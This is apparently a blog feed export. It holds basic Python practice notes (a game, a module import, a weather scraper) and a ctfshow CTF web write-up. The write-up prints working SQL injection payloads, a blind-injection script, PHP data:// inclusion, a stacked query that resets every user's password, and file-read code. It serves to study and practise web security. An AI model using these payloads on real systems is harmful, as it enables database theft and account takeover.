<h3 id="level1"><a href="#level1" class="headerlink" title="level1:"></a>level1:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211021358848.png" alt="1"></p>
<p>ä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#1-å‰ªåˆ€ï¼›2-çŸ³å¤´ï¼›3-å¸ƒ</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">count_pc=<span class="number">0</span></span><br><span class="line">count_per=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count_per&lt;<span class="number">3</span> <span class="keyword">and</span> count_pc&lt;<span class="number">3</span>:</span><br><span class="line">    pc=random.randint(<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line">    per=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥é€‰æ‹©ï¼š1-å‰ªåˆ€ï¼›2-çŸ³å¤´ï¼›3-å¸ƒ&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> per==<span class="number">1</span> <span class="keyword">and</span> pc==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å¹³&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">1</span> <span class="keyword">and</span> pc==<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you lose&quot;</span>)</span><br><span class="line">        count_pc=count_pc+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">1</span> <span class="keyword">and</span> pc==<span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you win&quot;</span>)</span><br><span class="line">        count_per=count_per+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">2</span> <span class="keyword">and</span> pc==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you win&quot;</span>)</span><br><span class="line">        count_per=count_per+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">2</span> <span class="keyword">and</span> pc==<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å¹³å±€&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">2</span> <span class="keyword">and</span> pc==<span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you lose&quot;</span>)</span><br><span class="line">        count_pc=count_pc+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">3</span> <span class="keyword">and</span> pc==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you lose&quot;</span>)</span><br><span class="line">        count_pc=count_pc+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">3</span> <span class="keyword">and</span> pc==<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you win&quot;</span>)</span><br><span class="line">        count_per=count_per+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">3</span> <span class="keyword">and</span> pc==<span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å¹³å±€&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> count_pc==<span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ€»æ¯”åˆ†ä¸º&#123;&#125;:&#123;&#125;,ä½ è¾“äº†&quot;</span>.<span class="built_in">format</span>(count_pc,count_per))</span><br><span class="line"><span class="keyword">elif</span> count_per==<span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ€»æ¯”åˆ†ä¸º&#123;&#125;:&#123;&#125;,ä½ èµ¢äº†äº†&quot;</span>.<span class="built_in">format</span>(count_pc,count_per))</span><br></pre></td></tr></table></figure>

<p>æƒ³ä¸å‡ºæ¥æœ‰å•¥å…¶ä»–ç®—æ³•ç®€åŒ–äº†ï¼Œå°±ç”¨æœ€å‚»é€¼çš„elifå¥½äº†</p>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2:"></a>level2:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211021359596.png" alt="2"></p>
<h4 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç :"></a>ä»£ç :</h4><p>mod:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">beautiful</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; is beautiful&quot;</span>.<span class="built_in">format</span>(x))</span><br></pre></td></tr></table></figure>

<p>main:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">from mod import beautiful</span><br><span class="line">beautiful(&quot;python&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="level3"><a href="#level3" class="headerlink" title="level3:"></a>level3:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211021400840.png" alt="3"></p>
<p>ä»£ç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests,re</span><br><span class="line"></span><br><span class="line">def del_join(del_content,list_content):</span><br><span class="line">    for i in list_content:</span><br><span class="line">        list=re.split(del_content,i)</span><br><span class="line">        str=&quot;&quot;</span><br><span class="line">        print(&quot;&#123;&#125;\t&quot;.format(str.join(list)),end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line">url=&quot;https://www.tianqi.com/chongqing/7/&quot;</span><br><span class="line">headers=&#123;</span><br><span class="line">&quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52&quot;</span><br><span class="line">&#125;</span><br><span class="line">html=requests.get(url,headers=headers).text</span><br><span class="line"></span><br><span class="line">temp_ch=re.compile(r&#x27;&lt;div class=&quot;weaul_z&quot;&gt;&lt;span&gt;(.*?)&lt;/div&gt;&#x27;)</span><br><span class="line">date_ch=re.compile(r&#x27;&lt;span class=&quot;fl&quot;&gt;(.*?)&lt;/span&gt;&#x27;)</span><br><span class="line">week_ch=re.compile(r&#x27;&lt;span class=&quot;fr&quot;&gt;(.*?)&lt;/span&gt;&#x27;)</span><br><span class="line"></span><br><span class="line">temp=temp_ch.findall(html)</span><br><span class="line">date=date_ch.findall(html)</span><br><span class="line">week=week_ch.findall(html)</span><br><span class="line"></span><br><span class="line">for i in date:</span><br><span class="line">    print(&quot;&#123;&#125;\t&quot;.format(i),end=&quot;&quot;)</span><br><span class="line">print(&quot;\n&quot;)</span><br><span class="line">for i in week:</span><br><span class="line">    print(&quot;&#123;&#125;\t&quot;.format(i),end=&quot;&quot;)</span><br><span class="line">print(&quot;\n&quot;)</span><br><span class="line">del_join(&quot;&lt;span&gt;|&lt;/span&gt;&quot;,temp)</span><br></pre></td></tr></table></figure>

<p>ç”¨requestså’Œreæ¨¡å—ï¼Œæœ¬æ¥æƒ³ç”¨beautifulsoupï¼Œä½†çˆ¬å‡ºæ¥ä¼šæœ‰ä¹±ç ï¼Œæ”¾å¼ƒäº†</p>
<p>reå…·ä½“çš„ç­›é€‰å°±ç”¨æ¸©åº¦ã€æ—¥æœŸå‰è¾¹çš„divç±»å‹ï¼Œç„¶åå‡ºæ¥çš„æ˜¯ä¸ªlist</p>
<p>åªæœ‰æ¸©åº¦ä¸­é—´æœ‰å…¶ä»–çš„å­—ç¬¦ï¼Œå°±å®šä¹‰ä¸€ä¸ªâ€del_joinâ€å‡½æ•°ï¼ŒæŠŠæ¸©åº¦ä¸­é—´çš„spanå’Œ&#x2F;spanåˆ æ‰å†æ‹¼æ¥èµ·æ¥å°±å¥½äº†</p>
<h3 id="level4"><a href="#level4" class="headerlink" title="level4:"></a>level4:</h3><p>æ­å»ºnovelaiï¼Œæ˜¾å¡1066ï¼Œæ­äº†ä¹Ÿæ²¡å•¥ç”¨ï¼Œæ‡’å¾—æ­äº†</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowç»ƒä¹ </title>
    <url>/2024/02/27/ctfshow%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="webç­¾åˆ°é¢˜"><a href="#webç­¾åˆ°é¢˜" class="headerlink" title="webç­¾åˆ°é¢˜"></a>webç­¾åˆ°é¢˜</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304072204882.png" alt="image-20230407220424812"></p>
<p>base64</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>æ˜¯sqlæ³¨å…¥ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œæå¾—æŒºæ¶å¿ƒçš„ï¼Œä¸Šsqlmapä¸çŸ¥é“ä¸ºå•¥è·‘ä¸å‡ºæ¥</p>
<p>è¿™ä¸ªæŠ¥é”™æ˜¯æ²¡æœ‰ä¸€ç‚¹æ˜¾ç¤ºçš„ï¼Œæå¾—æœ€å¼€å§‹æˆ‘éƒ½æ²¡å¼„æ¸…å•åŒå¼•å·</p>
<p>ä½†æœ¬è´¨ä¸Šè¿˜æ˜¯ä¸ªç®€å•çš„sqlæ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; or 1=1 #&amp;password=a</span><br></pre></td></tr></table></figure>

<p>æœ‰æ˜¾ç¤º</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304072227003.png" alt="image-20230407222706982"></p>
<p>order by æŸ¥åˆ°æ˜¯3ï¼Œè”åˆæ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; union select 1,database(),3#&amp;password=a</span><br></pre></td></tr></table></figure>

<p>è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„å›æ˜¾ä½æ˜¯2ï¼Œå¿…é¡»æŠŠè¦æŸ¥çš„ä¸œè¥¿æ”¾åœ¨ç¬¬äºŒä½</p>
<p>æ˜¾ç¤º<code>web2</code></p>
<p>çˆ†åº“çˆ†è¡¨çˆ†å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;web2&quot;#&amp;password=a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;flag&quot;#&amp;password=a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; union select 1,group_concat(flag),3 from web2.flag#&amp;password=a</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>æœ‰æç¤º</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304121531657.png" alt="image-20230412153140585"></p>
<p>é‚£å°±æ˜¯ä¼ªåè®®æ–‡ä»¶åŒ…å«äº†ï¼Œè€Œä¸”æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=data://text/plain,&lt;?=`cat ctf_go_go_go`;?&gt;</span><br></pre></td></tr></table></figure>

<p>æ˜¾ç¤ºå‡ºflag</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php include($_GET[&#x27;url&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶åŒ…å«è€ƒè™‘phpä¼ªåè®®ï¼Œä½†æ˜¯ä¼ å€¼ä¹‹åå‘ç°erroræŠ¥é”™ï¼Œçœ‹äº†wpæ‰çŸ¥é“åˆæ˜¯æ—¥å¿—åŒ…å«</p>
<p>ï¼ˆçœ‹äº†ä¸€çœ¼è¿‡æ»¤phpå’Œdataï¼‰</p>
<p>æ”¹ä¸ªUAå†å‘åŒ…ï¼Œå†™ä¸ªä¸€å¥è¯æœ¨é©¬è¿èšå‰‘</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($v1) &amp;&amp; isset($v2))&#123;</span><br><span class="line">            if(!ctype_alpha($v1))&#123;</span><br><span class="line">                die(&quot;v1 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(!is_numeric($v2))&#123;</span><br><span class="line">                die(&quot;v2 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(md5($v1)==md5($v2))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>ctype_alpha()åˆ¤æ–­æ˜¯å¦å…¨å­—æ¯ï¼Œis_numeric()åˆ¤æ–­æ˜¯å¦å…¨æ•°å­—ï¼Œç®€å•çš„md5ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708</span><br></pre></td></tr></table></figure>

<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>å”‰ï¼Œæ²¡æœ‰ä¸€ç‚¹æç¤ºï¼Œè¿‡æ»¤äº†orå’Œç©ºæ ¼ã€‚è¿˜æŠŠæŠ¥é”™å…³äº†ã€‚è¯•äº†ä¸€ä¸‹æ‰çŸ¥é“æœ‰ä¸‰åˆ—ï¼Œå›æ˜¾ä½åœ¨2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ˜¯æœ€å‚»é€¼çš„æ‹¼å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;web2&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,group_concat(flag),3/**/from/**/web2.flag#</span><br></pre></td></tr></table></figure>

<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>ä¸€æ ·çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,2,3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,database(),group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,database(),group_concat(flag)/**/from/**/web.flag#</span><br></pre></td></tr></table></figure>

<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>ç”¨<code>-1/**/or/**/1=1/**/order/**/by/**/3</code>æµ‹å‡ºæ¥æœ‰ä¸‰æ®µ</p>
<p>ä½†æ˜¯ç¦ç”¨äº†unionå…³é”®å­—ï¼Œé‚£å°±åªèƒ½ç”¨ç›²æ³¨äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://e3406b2c-d1a2-4d95-9939-2b3b5e00d525.challenge.ctf.show/&#x27;</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 80):</span><br><span class="line">    for j in range(32, 128):</span><br><span class="line">        payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot; % (</span><br><span class="line">        str(i), str(j))</span><br><span class="line">        test = s.get(url = url + &#x27;?id=0/**/or/**/&#x27; + payload).text</span><br><span class="line">        if &#x27;I asked nothing&#x27; in test:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot; % (</span><br><span class="line">        str(i), str(j))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br></pre></td></tr></table></figure>

<p>å”‰ï¼ŒphpmyadminçœŸæ˜¯å‚»é€¼ï¼Œä¹±åˆ‡æ¢æ•°æ®åº“ã€‚è·‘æµ‹è¯•çš„æ—¶å€™å¼„äº†å¥½ä¹…ï¼Œè¿˜å¾—æ˜¯Navicat</p>
<p>NPï¼Œå¯åŠ¨ï¼</p>
<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>å‘ƒå‘ƒï¼Œè„‘æ®‹æ˜¯ä¸ã€‚å•¥æç¤ºæ²¡æœ‰ï¼Œè¯•äº†ä¸ª<code>ffifdyop</code>ç»™æˆ‘å¼¹flagäº†ï¼Œä¹Ÿä¸æç¤ºæˆ‘md5</p>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>ç‚¹å‡»å–æ¶ˆå¼¹å‡ºæ¥ä¸ªindex.phpsï¼Œæ‰“å¼€æŸ¥çœ‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç›´æ¥ç”¨çš„strlenæ¥åˆ¤æ–­ï¼Œé‚£ä¹ˆåŒå†™å°±ç»•è¿‡ä¸äº†äº†ã€‚è¿˜æŠŠunion selectç¦ç”¨äº†ï¼Œé‚£quineæ³¨å…¥ä¹Ÿç”¨ä¸äº†</p>
<p>æœ¬æ¥æ˜¯æƒ³ç€ä½¿ç”¨å †å æ³¨å…¥ã€‚åœ¨åé¢å †å æ’å…¥ä¸€æ¡æ–°çš„æ•°æ®ã€‚ä½†ç”±äºä½¿ç”¨çš„æ˜¯mysqli_queryå‡½æ•°ï¼Œæ›´æ²¡æ³•å †å æ³¨å…¥ã€‚<code>å †å æ³¨å…¥è¦æ±‚ä½¿ç”¨mysqli_multi_queryå‡½æ•°</code>ï¼Œåªæœ‰è¿™ä¸ªå‡½æ•°èƒ½ä¸€æ¬¡æ€§æ‰§è¡Œå¤šæ¡è¯­å¥</p>
<p>çœ‹ä¼¼æ˜¯æ²¡ä»€ä¹ˆæ€è·¯äº†ï¼Œçœ‹äº†ä¸€ä¸‹åˆ«äººçš„wpæ‰çŸ¥é“è¿˜æœ‰ä¸€ç§æ–¹æ³•ä¹Ÿèƒ½æ„é€ å‡ºå¤šä¸€æ¡æ•°æ®</p>
<blockquote>
<p>GROUP BY ä¼šæ ¹æ®æ¯æ¡passwordçš„å€¼è¿›è¡Œåˆ¤æ–­ã€‚å¦‚æœç»“åˆSUMç­‰å‡½æ•°ï¼Œå°±å¯ä»¥åšåˆ°è®©passwordç›¸åŒçš„å€¼æ‰€å¯¹åº”çš„å…¶ä»–åˆ—å†…å®¹è¿›è¡ŒSUMç­‰æ“ä½œ</p>
<p>è‡³äº WITH ROLLUPï¼Œå®ƒæ˜¯ä¸€ç§ç”¨äºåœ¨ GROUP BY å­å¥ä¸­æ·»åŠ æ±‡æ€»è¡Œçš„é€‰é¡¹ã€‚å®ƒä¼šåœ¨ç»“æœä¸­æ·»åŠ ä¸€ä¸ªé¢å¤–çš„è¡Œï¼Œè¯¥è¡ŒåŒ…å«äº†æ‰€æœ‰åˆ†ç»„çš„èšåˆç»“æœã€‚åŒä¸Šï¼Œå¦‚æœè¿›è¡Œäº†SUMæ“ä½œï¼Œå°±ä¼šæŠŠæ‰€æœ‰çš„å€¼éƒ½SUMèµ·æ¥</p>
</blockquote>
<p>ä¾‹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309220951780.png" alt="image-20230922095013228"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `password`,SUM(`username`) FROM users GROUP BY `password`</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309220957193.png" alt="image-20230922095727165"></p>
<p>è€Œå¦‚æœåŠ ä¸Šrollupï¼Œå°±ä¼šå¤šå¤„ä¸€åˆ—ï¼Œå†æ¬¡è¿›è¡ŒSUMçš„æ±‡æ€»æ“ä½œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309220958495.png" alt="image-20230922095822472"></p>
<p>è€Œæ­¤æ—¶ï¼Œpasswordè¿™ä¸€æ ä¼šæ˜¾ç¤ºNULL</p>
<p>è¿™ä¸ªé¢˜å°±æ˜¯åˆ©ç”¨äº†è¿™ä¸ªç‚¹ï¼Œäº§ç”Ÿäº†ä¸€æ¡password&#x3D;Nullçš„æ•°æ®ã€‚è€Œè¿™æ—¶åœ¨POSTä¸­ä¼ å…¥nullå°±å¯echoå‡ºflag</p>
<blockquote>
<p>å†è¡¥å……ä¸€ä¸‹å †å æ³¨å…¥çš„åŠæ³•å§ï¼Œè™½ç„¶åœ¨è¿™é¢˜ç”¨ä¸äº†ï¼Œä½†è°çŸ¥é“ä»¥åå‘¢ã€‚åªé€‚ç”¨äºmysqli_multi_query</p>
<p>ä½¿ç”¨å¤šæ¡sqlè¯­å¥ï¼Œå¹¶ç”¨;åˆ†å‰²æ‰§è¡Œã€‚æœ¬è´¨ä¸Šæ˜¯å †å +äºŒæ¬¡æ³¨å…¥</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;1;;INSERT INTO `user`.`users` (`password`, `username`) VALUES (&#x27;test&#x27;, &#x27;test&#x27;);;UPDATE users SET password = &#x27;done&#x27;;UPDATE users SET username = &#x27;done&#x27;;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ä¸€æ¥å°±æŠŠæ‰€æœ‰çš„ç”¨æˆ·åå’Œå¯¹åº”çš„å¯†ç éƒ½è®¾ç½®ä¸ºdoneäº†</p>
</blockquote>
<h2 id="wb11"><a href="#wb11" class="headerlink" title="wb11"></a>wb11</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜ä¹Ÿæ˜¯å‡ºçš„äº‘é‡Œé›¾é‡Œçš„ï¼Œè·Ÿæ•°æ®åº“ä¸€ç‚¹å…³ç³»æ²¡æœ‰</p>
<p>$passwordå®é™…ä¸Šæ˜¯getä¼ å‚è¿›æ¥çš„ï¼Œå’Œsession[â€˜passwordâ€™]è¿›è¡Œæ¯”è¾ƒ</p>
<p>å¦‚æœä¸¤ä¸ªéƒ½ä¸ºç©ºå³å¯ç»•è¿‡</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309221311017.png" alt="image-20230922131119973"></p>
<p>åˆ æ‰passwordçš„èµ‹å€¼å’ŒCookie</p>
<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>F12ç»™å‡ºhit:?cmd&#x3D;</p>
<p>å°è¯•å¤šæ¬¡ä¹‹åå‘ç°ä¼ å…¥phpinfo();å¯ä»¥æˆåŠŸå›æ˜¾ï¼Œæ€è·¯å°±æ˜¯ç›´æ¥æŸ¥æ–‡ä»¶ã€‚ä½†æ˜¯ä¸€çœ‹phpinfoé‡Œèƒ½ç”¨çš„å‡½æ•°åŸºæœ¬å…¨ç»™æˆ‘banäº†ï¼Œç›´æ¥ç”¨å‘½ä»¤çš„æ–¹æ³•ä¹Ÿä¸ä¼šæ˜¯å¾ˆok</p>
<p>è¿™æ—¶å€™å°±è¦æƒ³åˆ°phpåŸç”Ÿç±»äº†ã€‚ç»“åˆæˆ‘ä¹‹å‰åšçš„ç¬”è®°ï¼Œç›´æ¥Globlterator+SplFileObjectå¼€æŸ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=$context = new SplFileObject(&#x27;/var/www/html/903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#x27;);foreach($context as $f)&#123;</span><br><span class="line">echo($f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

